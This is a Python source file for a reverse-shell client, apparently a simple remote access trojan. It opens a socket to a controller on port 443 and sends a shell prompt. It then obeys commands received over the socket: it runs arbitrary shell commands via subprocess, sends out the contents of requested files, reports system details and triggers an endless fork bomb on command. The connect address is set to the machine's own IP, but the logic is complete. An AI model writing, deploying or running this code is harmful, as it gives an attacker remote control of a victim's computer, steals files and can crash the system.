import os
import sys
import time
import socket
import getpass
import colorama
import platform
import subprocess
from colorama import Fore, Style

colorama.init()
R_HOST = socket.gethostbyname(socket.gethostname())
R_PORT = 443
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sys.stdout.write("Initializing connection...\n")
try:
    sock.connect((R_HOST, R_PORT))
    sys.stdout.write("Connection established!")
    while True:
        try:
            header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}
    {Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
            sock.send(header.encode())
            STDOUT, STDERR = None, None
            cmd = sock.recv(1024).decode("utf-8")
            if cmd == "list":  # List files in the dir
                sock.send(str(os.listdir(".")).encode())

            if cmd == "fork bomb":
                while True:
                    os.fork()
            elif cmd.split(" ")[0] == "cd":  # Change directory
                os.chdir(cmd.split(" ")[1])
                sock.send("Changed directory to {}".format(os.getcwd()).encode())
            elif cmd == "sysinfo":  # Get system info
                sysinfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
                sock.send(sysinfo.encode())
            elif cmd.split(" ")[0] == "download":  # Download files
                with open(cmd.split(" ")[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        sys.stdout.write("Sending" + str(file_data))
                        sock.send(file_data)
                        file_data = f.read(1024)
                    time.sleep(2)
                    sock.send(b"DONE")
                sys.stdout.write("Finished sending data")
            elif cmd == "exit":  # Terminate the connection
                sock.send(b"exit")
                break
            else:  # Run any other command
                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)

            if not cmd:  # If the connection terminates
                sys.stdout.write("Connection dropped")
                break
        except Exception as e:
            with open("StatusLogs.log", "a") as f:
                f.write(f"{time.ctime()}: {str(e)}")
                f.write('\n')
            sock.send("An error has occurred: {}".format(str(e)).encode())
except Exception as err:
    with open("ProgramLogs.log", "a") as file:
        file.write(f"{time.ctime()}: {str(err)}")
        file.write('\n')
    sys.stdout.write("Connection terminated unexpectedly!\n")
finally:
    sock.close()
